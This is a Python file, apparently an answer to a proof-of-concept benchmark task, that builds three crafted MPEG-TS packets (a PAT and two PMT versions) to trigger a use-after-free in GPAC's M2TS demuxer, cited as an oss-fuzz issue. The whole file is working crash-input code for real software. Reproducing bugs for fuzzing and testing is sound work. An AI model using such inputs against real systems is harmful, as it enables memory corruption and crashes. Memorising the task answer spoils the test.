class Solution:
    def _mpegts_crc32(self, data: bytes) -> int:
        """
        Calculates the CRC-32 for an MPEG-TS section, as per ISO/IEC 13818-1.
        """
        crc = 0xFFFFFFFF
        for byte in data:
            crc ^= (byte << 24)
            for _ in range(8):
                if crc & 0x80000000:
                    crc = (crc << 1) ^ 0x04C11DB7
                else:
                    crc = crc << 1
        return crc & 0xFFFFFFFF

    def _create_ts_packet(self, pid: int, payload: bytes, pusi: int = 0, continuity_counter: int = 0) -> bytes:
        """
        Creates a 188-byte MPEG-TS packet.
        """
        header = bytearray(4)
        
        # Sync byte
        header[0] = 0x47
        
        # Transport Error Indicator (0), Payload Unit Start Indicator, Transport Priority (0)
        # PID (high 5 bits)
        header[1] = (pusi << 6) | ((pid >> 8) & 0x1F)
        
        # PID (low 8 bits)
        header[2] = pid & 0xFF
        
        # Transport Scrambling Control (00), Adaptation Field Control (01 = payload only), Continuity Counter
        header[3] = (1 << 4) | (continuity_counter & 0x0F)
        
        packet_data = header + payload
        
        # Pad with 0xFF to make the packet 188 bytes long
        padding_len = 188 - len(packet_data)
        if padding_len < 0:
            raise ValueError("Payload too large for a single TS packet")
            
        return packet_data + (b'\xff' * padding_len)

    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a use-after-free vulnerability in GPAC's M2TS demuxer.
        The vulnerability (oss-fuzz:372994344) is in `gf_m2ts_demux_process_pmt` and
        is triggered when a PMT with an updated version number is processed. This causes
        the existing elementary stream objects to be freed, but a local pointer `es`
        is not cleared, leading to its use after being freed.

        The PoC consists of three 188-byte M2TS packets:
        1. A PAT (Program Association Table) to define a program and its PMT PID.
        2. The initial PMT (Program Map Table) with version 0, defining an elementary stream.
        3. An updated PMT with version 1, which triggers the vulnerability.
        """
        
        # --- Packet 1: PAT (Program Association Table) ---
        # Defines Program 1 with PMT PID 0x0100
        pat_section = bytearray(b'\x00'      # table_id
                                b'\xb0\x0d'  # section_syntax_indicator=1, section_length=13
                                b'\x00\x01'  # transport_stream_id
                                b'\xc1'      # version_number=0, current_next_indicator=1
                                b'\x00'      # section_number
                                b'\x00'      # last_section_number
                                b'\x00\x01'  # program_number
                                b'\xe1\x00') # program_map_PID=0x100
        
        pat_crc = self._mpegts_crc32(pat_section).to_bytes(4, 'big')
        pat_section.extend(pat_crc)
        
        # A PSI section is prepended with a pointer_field (0x00)
        pat_payload = b'\x00' + pat_section
        
        packet1 = self._create_ts_packet(pid=0x0000, payload=pat_payload, pusi=1, continuity_counter=0)
        
        # --- Packet 2: PMT (Program Map Table), version 0 ---
        # Defines an H.264 stream (PID 0x0101) for Program 1
        pmt0_section = bytearray(b'\x02'      # table_id
                                 b'\xb0\x13'  # section_syntax_indicator=1, section_length=19
                                 b'\x00\x01'  # program_number
                                 b'\xc1'      # version_number=0
                                 b'\x00'      # section_number
                                 b'\x00'      # last_section_number
                                 b'\xe1\x01'  # PCR_PID=0x101
                                 b'\xf0\x00'  # program_info_length=0
                                 b'\x1b'      # stream_type=H.264
                                 b'\xe1\x01'  # elementary_PID=0x101
                                 b'\xf0\x00') # ES_info_length=0
        
        pmt0_crc = self._mpegts_crc32(pmt0_section).to_bytes(4, 'big')
        pmt0_section.extend(pmt0_crc)
        
        pmt0_payload = b'\x00' + pmt0_section

        packet2 = self._create_ts_packet(pid=0x0100, payload=pmt0_payload, pusi=1, continuity_counter=0)
        
        # --- Packet 3: PMT (Program Map Table), version 1 ---
        # This is an update to the previous PMT and triggers the UAF.
        pmt1_section = bytearray(b'\x02'      # table_id
                                 b'\xb0\x13'  # section_length
                                 b'\x00\x01'  # program_number
                                 b'\xc3'      # version_number=1 (this is the trigger)
                                 b'\x00'      # section_number
                                 b'\x00'      # last_section_number
                                 b'\xe1\x01'  # PCR_PID
                                 b'\xf0\x00'  # program_info_length
                                 b'\x1b'      # stream_type
                                 b'\xe1\x01'  # elementary_PID
                                 b'\xf0\x00') # ES_info_length

        pmt1_crc = self._mpegts_crc32(pmt1_section).to_bytes(4, 'big')
        pmt1_section.extend(pmt1_crc)
        
        pmt1_payload = b'\x00' + pmt1_section
        
        # Continuity counter for PID 0x0100 is incremented from the previous packet.
        packet3 = self._create_ts_packet(pid=0x0100, payload=pmt1_payload, pusi=1, continuity_counter=1)
        
        return packet1 + packet2 + packet3